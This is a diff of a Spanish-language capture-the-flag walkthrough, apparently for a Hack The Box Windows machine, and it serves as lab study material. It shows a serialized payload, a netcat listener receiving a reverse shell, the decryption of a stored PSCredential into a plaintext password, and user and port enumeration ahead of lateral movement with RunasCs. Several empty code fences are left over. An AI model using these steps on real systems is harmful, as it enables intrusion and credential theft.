@@ -313,22 +313,123 @@ Y generamos una nuevo payload serializado
 ```bash
 NZRnBkq8pokokPXlerdJAImOuZCMAv4kczJi0xv2deHZVBbag6WbBX4QeJSvud9Xf9%2FqbDZJD6py3CYVlT%2BUyMzeFvwq21a%2FkMGLtAHEOOxQij%2FuLiVKDDvXI2NObDN%2FxTBbw8QLFvqu8VVCrXgHlmvn38Pf8hTqNkuUuvvU0OUimcGqFIQtEr3v%2BJLjbot6ewfdAm%2FrB9GwlVRlOUs4XkyMlJ8aEK2zRuHeBNfRE833WrUctzfVTJ7t5m4sA3fB21y2kSqmxZ7yAvAhHSAjdzssYCTayhL1dJLAFbRIjgqGdj38CzycKYOWMhGadhJQuDmRxqoP%2F8zX3Zh8%2FiKgprembyzyRYPXJyNNhLA8MlZFU0jXd1ihdsZ8boR%2FP7KvNtjpCebKkje2Yx5oi%2B7seaRdC6hW7qduWM6tHK2BudklaS0DguKiMyHYeHp2PsTPr4c99yOy0Z%2F5uglSqbJ70gYe6AFcrMnfsPGPRCOHwHiIlVBwS3HrFvZ7wS7N1n4oSDjUQn%2FxRIoZiYcoBRjvmYsPOGE5OK9Gytxxlz2Y3yoAt1229PXZrWKzb8bQCPD%2Bko2tfIiWPxCp5BjwSF7mST3leQrGGo6ZmXN91Qnz71UE%2B%2FVhsmT7WKwsaZjs5vLbTwKYKQR7CxgC5olRiiiqLSgx7OGjF1r53wXPiH2RS0armm41Se5wcnk7v3GyGZ5mF%2Fco34xGliH3Rbfqi7W1aYKWa134WlVASqnBclr9iXwZAi8d7i9Hclm3ME7Xp8bCFqjVCPP4VYFw4tePEnQF1EJQKabFj9mn2HEijXpannxnH%2BCLZN7tlkf5V0KhyBiupYmq3ySg3CQX7oOuQ0kjOf9wbklrQBPiXY2IAPUDKetjqZBasXmd0sm9Brvim6vUk5ubN6YNURHDRuBZzvj1SSbgOchwIxA%2BNVOBTnJkArgHO7q%2BoZ%2FkFWc5TbwwyfR80n2piy3w94dEdKc1gO0RvQQMePo6zb3%2Fm0YN4iPtk8tvnXBYk41cbI6PrbkwW4BuKgh4ZC4TdGIEAxzDzWNBGGReNL8somhqMLDQ4qHdp8s%2FhNefKA7vJw7DO5RMv54V%2BU6ku%2BDXuR3iPLxpgcuf8QcOpclChEi3bdrARaKvYobniPWtwaJWaaTNjwy3WROwoFsLlPn8Tu7ghLfj3d9ZbnicdyL9Ud5f2d8EhPxHbx7hS7Rm3vxyAyIDfNLkXV73pjt%2BtcmMr1ZHqmOSwt%2BtlYd8d1tiTsLj0ApYBQCN%2B0LszcsjKMKD8p9DolgfmwzTQSYX3LU9Ro2iYdLgrCEJrsedjWdCFv48%2BnpT%2BDCXVh2FmTJfY%2Bh%2FHBkpHlBDXssQUXygSYBxsXtZ4IrBmc2Vj2X3zHUTR3t9rRh8j534%2B%2B%2FcePflDoW%2BqYfIwKZ250eVkbSAFSNEPTFBXeB%2F6HnRAQfYZkDJiCmsqycfTI%2BECVskGbOhpG2UTueNXMHangw%2FoohyLTZ8rgcswxky5RxVmRZu4rBGAnSmFhXsAI4aLBqkNG4mtrou8iCHCVitVdclBPbS%2Bvv%2BEnPNml3jDZXCIe%2FxrqgNVR4gK9v5JFAzfm0W1n1Mi%2BXxK2CtKf9TedosrzZ2grV68RHROEtvrIf%2BcZexwKR6xtV1pToc0tCmAK9bWj52ycGWUU3JYjGIQk2nOzyCjoUfJZWwSdPbaJQ94j89kcX9TiXXO%2B58Vf0K5sQ4S5gHjh5RcU3mOaz3g8eXr4juZ0PaJvyzeDq5JYNziKOffQ5sLfhRkOsqp1BB%2BKhgDBPbpZfuL8XCK%2BZwJKncHHLqOFDgqmj%2FTZDXa7FOSgttqUKBQ5vApdNcadL7EbhAeZHu0EQxvaaCQ3Kahhvubk2EsY855dZQi5X4rjNbGZ0U9KVC2IE%2F4DbEynGt%2BmoyIX5%2FOB49Ac6%2FGO691bWeEX%2F2t28SQkktAmd3wf7n6J2lOCZPOhH62R%2B435UdTT%2BYQrVzocNx9%2B0AQFPHyGIKFwyYpVzqXI7MiaiJgQQJ6hmZoOZZHEK8v%2Biv%2FROhDE8EuaUTKdJN%2B6mbH8Rf0hLhhQL0tmKhCR2hQb6dXq2Bhn6O2QUNAtR0kow6f5JZSvu0zyWx5fYf7xClQBALkGAOx47j0OPzPniB7n%2FgyR0fWtsbRYEBElQKcPJjbDkNOj7gMYAMIx5IzSe4PVoKKfX69AK7AVAIt9z2AX7LUMAqRXeFxM0Z%2F0vrFLJ44cEJkqnsffoSjjpz5WGEx%2BPXzgG7eMBXHti3VqMc0LCZ7%2BbNZe2IIFgkkz5ypcWDS2sYvP0EQXqCKmPdgskYJmXiCOjp2f%2BzvoxRjtdRYRZjQndTXLthXrlOesZqJewQqNdxU1kOYCiI7lzJ2sn5oQ5abhTufLPVLqNgECxC%2FvvnzdYY3sIurSWS5X93PQw2QXyNol8oa5uIY3hvOAsE9ih0FS6EYndoFIQC%2ByowiX7rIyeCPc%2BYiZ5kxSiFlnJkOfyq%2B%2Beb3RBR8yS5aYIXAyiV3fMOkKuQUu4u7H2wdXzgsgmesfazrZ0Vb9ZJMyaM%2FvB2zBXdE%2FgzbjVfm8irGrSuchGf2LV%2F%2BR0bV%2BVQiXOmEAqSTsI37bDwGN1Ozuu1Gp2b9R33QkrAFHTyEOaoFW3ErS4NDAuh6wfhGI0MGejNGl3QfV73YpLKSgaHQ5OP2fM6PDLGfQyWPeFoRqjYWQXlsDqojDu03EeoPA2GMCNP7bM8E2OknM5tj0neQMkQoE2bjfNWRAJOhSksv1nu2pDBsCdU9mhghr96OKTa2VIzBMDwZULDdiZgoofpQwBs5%2B%2Fd%2FxuKUx3FNyU%2FLPVKVcB%2FNUGg3kfvWEqiVa2wQuqtQJIc8Y%2FDN0JgcufKLIYdS7H5OAZACtFdineHailwyFOnClr0Tq4x5w2h4KM1cMjMh8cXbh2heAcqKIPOxEMiiswtp4wTIaBgbXik8DB86ewQEgHQc9l1aH1RYr%2F6J2ioqap3uF2JTX85EEiuM5FvFLqrBinoqgAdX32c0pVxQSBJ%2BIfDuL1UMT3AXXtGLeop9JnArj1X2L6kZQYVeTD3zFGHdU9VE4dBjpvj2%2BbxQZqad38ssMfw4Q%3D%3D
 ```
-Preparo la sesion de netcat para poder operar en la reverse shell y ejecutamos la peticion con el nuevo payload
-```bash
+Preparo la sesion de netcat para poder operar en la reverse shell y ejecutamos la peticion con el nuevo payload y hackeado..! 
+```powershell
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
 └──╼ #rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
+connect to [10.10.15.14] from (UNKNOWN) [10.129.185.102] 49671
 
+PS C:\windows\system32\inetsrv> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::64ad:b5b6:76f:be4a
+   Link-local IPv6 Address . . . . . : fe80::46db:416:4f2:a0b1%4
+   IPv4 Address. . . . . . . . . . . : 10.129.185.102
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%4
+                                       10.129.0.1
+PS C:\windows\system32\inetsrv> 
 
 ```
+Navegamos por las carpetas aver si encontramos algo..! Tenemos una contraseña en powershell, que figua como un objeto PSCredential y lo podemos decifrar https://stackoverflow.com/questions/63639876/powershell-password-decrypt
+
+```powershell
+PS C:\users\sfitz\Documents> type connection.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+PS C:\users\sfitz\Documents> 
 
 ```
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
+Como es un archivo y para poder ver la contraseña de alaading ejecutamos:
+
+```powershell
+PS C:\users\sfitz\Documents> $Credential = Import-Clixml -path .\connection.xml
+PS C:\users\sfitz\Documents> $Credential
+
+UserName                     Password
+--------                     --------
+alaading System.Security.SecureString
+
+
+PS C:\users\sfitz\Documents> $Credential.GetNetworkCredential().password
+f8gQ8fynP44ek1m3
+PS C:\users\sfitz\Documents> 
+
+```
+Analizamos sobre el usuario y vemos que tiene permisos para conectarse remotamente
+
+```powershell
+PS C:\users\sfitz\Documents> net user
+
+User accounts for \\POV
+
+-------------------------------------------------------------------------------
+Administrator            alaading                 DefaultAccount           
+Guest                    sfitz                    WDAGUtilityAccount       
+The command completed successfully.
+
+PS C:\users\sfitz\Documents> net user alaading
+User name                    alaading
+Full Name                    
+Comment                      
+User s comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+Password last set            11/6/2023 10:59:23 AM
+Password expires             Never
+Password changeable          11/6/2023 10:59:23 AM
+Password required            Yes
+User may change password     Yes
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/25/2023 4:56:21 PM
+Logon hours allowed          All
+Local Group Memberships      *Remote Management Use*Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+```
+Verificamos que tenemos abierto el puerto 5985 usaremos [runas](https://github.com/antonioCoco/RunasCs) par ejecutrar comandos como otro usuario
+```powershell
+S C:\users\sfitz\Documents> netstat /nat
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           Offload State
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       InHost      
+  TCP    10.129.185.102:139     0.0.0.0:0              LISTENING       InHost      
+  TCP    10.129.185.102:49671   10.10.15.14:443        ESTABLISHED     InHost  
+```
 ```bash
 ```bash
 ```bash
